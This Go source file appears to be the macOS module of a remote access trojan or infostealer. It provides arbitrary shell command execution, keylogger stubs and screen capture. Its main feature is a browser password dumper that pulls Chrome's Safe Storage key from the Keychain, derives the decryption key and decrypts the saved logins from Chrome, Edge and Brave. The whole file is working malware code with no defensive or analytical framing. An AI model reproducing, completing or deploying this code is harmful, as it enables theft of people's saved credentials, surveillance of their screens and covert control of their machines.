//go:build darwin

package darwin

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/keybase/go-keychain"
	"github.com/kbinani/screenshot"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

// DarwinPlatform represents the macOS platform.
type DarwinPlatform struct{}

// NewPlatform returns a new instance of the DarwinPlatform.
func NewPlatform() *DarwinPlatform {
	return &DarwinPlatform{}
}

// ExecuteCommand executes a command on macOS.
func (p *DarwinPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	return cmd.CombinedOutput()
}

// Init does nothing on macOS.
func (p *DarwinPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on macOS.
func (p *DarwinPlatform) StartKeylogger() {}

// GetKeylogs does nothing on macOS.
func (p *DarwinPlatform) GetKeylogs() string {
	return "Keylogger not implemented for macOS."
}

// DumpBrowsers extracts and decrypts browser passwords from the macOS Keychain.
func (p *DarwinPlatform) DumpBrowsers() string {
	var buffer bytes.Buffer
	profiles := getBrowserProfiles()

	for _, path := range profiles {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			browserName := getBrowserName(path)
			buffer.WriteString(fmt.Sprintf("--- %s ---\n", browserName))

			// On macOS, the master key is the user's login password, retrieved from the Keychain.
			masterKey, err := getMasterKey()
			if err != nil {
				buffer.WriteString(fmt.Sprintf("Error getting master key: %v\n", err))
				continue
			}

			loginDataPath := filepath.Join(path, "Login Data")
			buffer.WriteString(dumpLogins(loginDataPath, masterKey))
		}
	}
	return buffer.String()
}

func getBrowserProfiles() []string {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	return []string{
		filepath.Join(home, "Library/Application Support/Google/Chrome/Default"),
		filepath.Join(home, "Library/Application Support/Microsoft Edge/Default"),
		filepath.Join(home, "Library/Application Support/BraveSoftware/Brave-Browser/Default"),
	}
}

func getBrowserName(path string) string {
	parts := strings.Split(path, string(filepath.Separator))
	for i := len(parts) - 1; i >= 0; i-- {
		switch parts[i] {
		case "Google":
			return "Chrome"
		case "Microsoft Edge":
			return "Edge"
		case "BraveSoftware":
			return "Brave"
		}
	}
	return "Unknown"
}

func getMasterKey() ([]byte, error) {
	password, err := keychain.GetGenericPassword("Chrome Safe Storage", "Chrome", "", "")
	if err != nil {
		return nil, fmt.Errorf("could not get password from keychain: %w", err)
	}

	// Derive the key using PBKDF2, which is what Chrome on macOS uses.
	// The salt is "saltysalt" and the number of iterations is 1003.
	key := pbkdf2.Key(password, []byte("saltysalt"), 1003, 16, sha1.New)
	return key, nil
}

func dumpLogins(path string, masterKey []byte) string {
	var buffer bytes.Buffer
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return ""
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		rows.Scan(&url, &username, &encryptedPassword)
		if len(encryptedPassword) > 0 {
			decrypted, err := decryptPassword(encryptedPassword, masterKey)
			if err == nil {
				buffer.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\n\n", url, username, decrypted))
			}
		}
	}
	return buffer.String()
}

func decryptPassword(encrypted, masterKey []byte) (string, error) {
	// Chrome on macOS uses AES-CBC with a blank IV.
	if len(encrypted) < 3 {
		return "", fmt.Errorf("invalid encrypted data")
	}

	iv := make([]byte, 16)
	payload := encrypted[3:] // Skip "v10" or "v11" prefix

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	cbc := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(payload))
	cbc.CryptBlocks(decrypted, payload)

	// Unpad the decrypted data
	padding := int(decrypted[len(decrypted)-1])
	if padding > len(decrypted) {
		return "", fmt.Errorf("invalid padding")
	}
	return string(decrypted[:len(decrypted)-padding]), nil
}

// Screenshot captures the screen.
func (p *DarwinPlatform) Screenshot() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, fmt.Errorf("error capturing screen: %v", err)
	}

	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, fmt.Errorf("error encoding screenshot: %v", err)
	}

	return buf.Bytes(), nil
}
